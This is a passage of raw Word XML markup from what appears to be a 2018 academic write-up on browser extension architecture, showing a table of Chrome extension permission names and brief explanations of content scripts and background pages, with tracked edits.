            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>desctopCapture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6092F4CD" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>pageCapture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="00C649F2" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>tabCapture</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="32B7ED8D" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="394EA10B" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>background</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1884EBC1" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>downloads</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3E550CE7" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>power</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5FDCBFD3" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>tabs</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="2CAE8CFA" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55210347" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>bookmarks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6E879873" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>fontSettings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="62F075ED" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>printerProvider</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3DE8F291" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>topSites</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="76A07626" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F6326AA" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>browsingData</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="59CF2B69" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>gcm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7BC14B4F" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>privacy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="417312AE" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>tts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="60FB3591" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="04E180F3" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>clipboardRead</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5A1CA88B" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>geolocation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="187AB42A" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>proxy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="365E76AA" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>ttsEngine</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="2A7F15B1" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2042E567" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>clipboardWrite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="41675F35" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>history</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="35BC5656" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1548F22B" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>unlimitedStorage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="03384AEC" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="686FF85F" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>contentSettings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2A9842E2" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>identity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2E4AA0EF" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>storage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="000CB995" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>webNavigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="13164E1E" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="219EDF48" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>contextMenus</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="66E8A058" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>idle</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="055C39C5" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.cpu</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3E210053" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>web.request</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="3DF15D02" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="59BF7FD5" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>cookies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2297EB4B" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>management</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="392A58B7" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.display</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="289A2E5D" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>webRequestBlocking</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A20D5" w:rsidRPr="001A20D5" w14:paraId="34224765" w14:textId="77777777" w:rsidTr="001F7F0C">
        <w:trPr>
          <w:trHeight w:val="396"/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2264" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6F89EA8B" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>debugger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2350" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18F7C804" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>nativeMessaging</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2273" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74C0FC1E" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="001A20D5">
              <w:t>system.memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2458" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2A9513B8" w14:textId="77777777" w:rsidR="001A20D5" w:rsidRPr="001A20D5" w:rsidRDefault="001A20D5" w:rsidP="001A20D5">
            <w:pPr>
              <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2219C775" w14:textId="77777777" w:rsidR="0097075E" w:rsidRDefault="0097075E" w:rsidP="004A4153">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52059E35" w14:textId="77777777" w:rsidR="0097075E" w:rsidRPr="0097075E" w:rsidRDefault="00773A6A" w:rsidP="0097075E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="87" w:name="_Toc523071496"/>
      <w:r>
        <w:t>Content Scripts</w:t>
      </w:r>
      <w:bookmarkEnd w:id="87"/>
    </w:p>
    <w:p w14:paraId="3C9334C4" w14:textId="77777777" w:rsidR="0097075E" w:rsidRPr="00A730F4" w:rsidRDefault="00CB1634" w:rsidP="0097075E">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Content scripts is a list that indicates JavaScript files that will run inside of the web page. The execution of a con</w:t>
      </w:r>
      <w:r w:rsidR="00097F2F">
        <w:t>tent script not only can modify the DOM tree of other scripts, but it can also issue authenticated web requests like POST.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765C110D" w14:textId="4B33FBC7" w:rsidR="0097075E" w:rsidRDefault="009E1111" w:rsidP="004A4153">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>In Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00BD7AA7">
        <w:t>, we can see 2 JavaScript files included</w:t>
      </w:r>
      <w:ins w:id="88" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
        <w:r w:rsidR="004B213E">
          <w:t>. Both scripts</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="89" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
        <w:r w:rsidR="00BD7AA7" w:rsidDel="004B213E">
          <w:delText>, that</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00BD7AA7">
        <w:t xml:space="preserve"> will</w:t>
      </w:r>
      <w:ins w:id="90" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
        <w:r w:rsidR="004B213E">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="91" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
        <w:r w:rsidR="00BD7AA7" w:rsidDel="004B213E">
          <w:delText xml:space="preserve"> be </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00BD7AA7">
        <w:t xml:space="preserve">run in the context of the page for any URLs matching the </w:t>
      </w:r>
      <w:r w:rsidR="00BD7AA7" w:rsidRPr="00BD7AA7">
        <w:t>http://www.yahoo.com/</w:t>
      </w:r>
      <w:r w:rsidR="00BD7AA7">
        <w:t xml:space="preserve"> pattern.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4507155C" w14:textId="77777777" w:rsidR="00BD7AA7" w:rsidRDefault="00BD7AA7" w:rsidP="004A4153">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BCB4B28" w14:textId="77777777" w:rsidR="00EB28E0" w:rsidRPr="0097075E" w:rsidRDefault="00EB28E0" w:rsidP="00EB28E0">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="_Toc523071497"/>
      <w:r>
        <w:t>Background Pages</w:t>
      </w:r>
      <w:bookmarkEnd w:id="92"/>
    </w:p>
    <w:p w14:paraId="010F041E" w14:textId="55C885A7" w:rsidR="001D2830" w:rsidDel="00C05B8C" w:rsidRDefault="00F05903" w:rsidP="00BD7AA7">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:del w:id="93" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F05903">
        <w:t>Background pages often contain the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F05903">
        <w:t>logic and state an extension needs for the entirety</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F05903">
        <w:t>of the browser session and do not have any visibility</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F05903">
        <w:t>to the user.</w:t>
      </w:r>
      <w:ins w:id="94" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
        <w:r w:rsidR="00C05B8C">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="381DAA6C" w14:textId="77777777" w:rsidR="00BD7AA7" w:rsidRDefault="00BD7AA7" w:rsidP="00C05B8C">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
        <w:pPrChange w:id="95" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:38:00Z">
          <w:pPr>
            <w:spacing w:line="240" w:lineRule="auto"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure 2 shows how </w:t>
      </w:r>
      <w:r w:rsidRPr="00550840">
        <w:rPr>
          <w:i/>
          <w:rPrChange w:id="96" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:39:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>background.js</w:t>
      </w:r>
      <w:r>
